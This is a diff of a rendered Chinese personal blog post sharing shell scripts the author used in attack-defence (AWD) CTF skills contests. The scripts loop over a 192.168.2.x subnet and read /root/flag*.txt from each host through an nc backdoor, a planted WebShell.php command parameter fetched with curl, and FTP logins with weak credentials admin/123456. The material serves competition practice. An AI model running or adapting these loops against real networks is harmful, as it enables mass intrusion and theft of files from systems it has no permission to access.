@@ -21,18 +21,18 @@
     
     
     <meta name="keywords" content="Shell脚本">
-    <meta name="description" content="我全国职业技能大赛比赛时所用的脚本: 1234567nc后门:port=10001 for i in `seq 101 254`;doip=&quot;192.168.2.&quot;$ipayload=`echo &quot;cat /root/flag*.txt;exit&quot; | nc $ip $port`done  123456webshell:or i in `seq 101 254`;doip=&quot;192.168.2.&quot;">
+    <meta name="description" content="0x00 介绍我在全国职业技能大赛比赛时所用的shell脚本: 1234567nc后门:port=10001 for i in `seq 101 254`;doip=&quot;192.168.2.&quot;$ipayload=`echo &quot;cat /root/flag*.txt;exit&quot; | nc $ip $port`done  123456webshell:or i in `seq 101 254`;doip">
 <meta name="keywords" content="Shell脚本">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Shell脚本">
 <meta property="og:url" content="https://hu5k7.github.io/2019/09/17/Shell脚本/index.html">
 <meta property="og:site_name" content="Hu5k7&#39;s Blog">
-<meta property="og:description" content="我全国职业技能大赛比赛时所用的脚本: 1234567nc后门:port=10001 for i in `seq 101 254`;doip=&quot;192.168.2.&quot;$ipayload=`echo &quot;cat /root/flag*.txt;exit&quot; | nc $ip $port`done  123456webshell:or i in `seq 101 254`;doip=&quot;192.168.2.&quot;">
+<meta property="og:description" content="0x00 介绍我在全国职业技能大赛比赛时所用的shell脚本: 1234567nc后门:port=10001 for i in `seq 101 254`;doip=&quot;192.168.2.&quot;$ipayload=`echo &quot;cat /root/flag*.txt;exit&quot; | nc $ip $port`done  123456webshell:or i in `seq 101 254`;doip">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-06-07T05:52:01.031Z">
+<meta property="og:updated_time" content="2019-09-24T17:18:47.390Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Shell脚本">
-<meta name="twitter:description" content="我全国职业技能大赛比赛时所用的脚本: 1234567nc后门:port=10001 for i in `seq 101 254`;doip=&quot;192.168.2.&quot;$ipayload=`echo &quot;cat /root/flag*.txt;exit&quot; | nc $ip $port`done  123456webshell:or i in `seq 101 254`;doip=&quot;192.168.2.&quot;">
+<meta name="twitter:description" content="0x00 介绍我在全国职业技能大赛比赛时所用的shell脚本: 1234567nc后门:port=10001 for i in `seq 101 254`;doip=&quot;192.168.2.&quot;$ipayload=`echo &quot;cat /root/flag*.txt;exit&quot; | nc $ip $port`done  123456webshell:or i in `seq 101 254`;doip">
     
     <link rel="shortcut icon" href="/img/favicon.ico">
     <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
@@ -155,6 +155,13 @@
 
 <div class="container body-wrap">
     
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x00-介绍"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 介绍</span></a></li></ol>
+        </nav>
+    </aside>
+
 
 <article id="post-Shell脚本"
   class="post-article article-type-post fade" itemprop="blogPost">
@@ -177,16 +184,18 @@
 
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <p>我全国职业技能大赛比赛时所用的脚本:</p>
+            <h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>我在全国职业技能大赛比赛时所用的shell脚本:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc后门:</span><br><span class="line">port=10001 </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 101 254`;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ip=<span class="string">"192.168.2."</span><span class="variable">$i</span></span><br><span class="line">payload=`<span class="built_in">echo</span> <span class="string">"cat /root/flag*.txt;exit"</span> | nc <span class="variable">$ip</span> <span class="variable">$port</span>`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webshell:</span><br><span class="line">or i in `seq 101 254`;</span><br><span class="line">do</span><br><span class="line">ip="192.168.2."$i</span><br><span class="line">curl http://$ip/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txt</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webshell:</span><br><span class="line">or i <span class="keyword">in</span> `seq 101 254`;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ip=<span class="string">"192.168.2."</span><span class="variable">$i</span></span><br><span class="line">curl http://<span class="variable">$ip</span>/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txt</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ftp:</span><br><span class="line">username='admin'</span><br><span class="line">passwd='123456'</span><br><span class="line">for i in `seq 101 254`;</span><br><span class="line">do</span><br><span class="line">ip="192.168.2."$i</span><br><span class="line">sh ftpmain.sh $ip $username $passwd</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ftp:</span><br><span class="line">username=<span class="string">'admin'</span></span><br><span class="line">passwd=<span class="string">'123456'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 101 254`;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ip=<span class="string">"192.168.2."</span><span class="variable">$i</span></span><br><span class="line">sh ftpmain.sh <span class="variable">$ip</span> <span class="variable">$username</span> <span class="variable">$passwd</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">配合ftp使用</span></span><br><span class="line">ftpmain:</span><br><span class="line">ftp $1 -inv</span><br><span class="line">user $2 $3</span><br><span class="line">get /root/flag*.txt</span><br><span class="line">bye</span><br><span class="line">!</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配合ftp使用</span></span><br><span class="line">ftpmain:</span><br><span class="line">ftp <span class="variable">$1</span> -inv</span><br><span class="line">user <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">get /root/flag*.txt</span><br><span class="line"><span class="built_in">bye</span></span><br><span class="line">!</span><br></pre></td></tr></table></figure>
 
+<blockquote>
 <p>有一些地方得注意改动，什么IP地址NC后门的端口FTP那边的弱用户弱密码什么的等等…。<br>尤其是一些标点符号的小细节不能忘记，该空格的地方就得空格，最好先实验一遍在拿去实战<br>这些都可以拿到一些攻防比赛 如: CTF的AWD 或者一些 技能大赛</p>
+</blockquote>
 <p><strong>转载请标明出处</strong></p>
 
         </div>
@@ -196,7 +205,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2019-06-07T05:52:01.031Z" itemprop="dateUpdated">2019-06-07 05:52:01</time>
+    Last updated: <time datetime="2019-09-24T17:18:47.390Z" itemprop="dateUpdated">2019-09-24 17:18:47</time>
 </span><br>
 
 
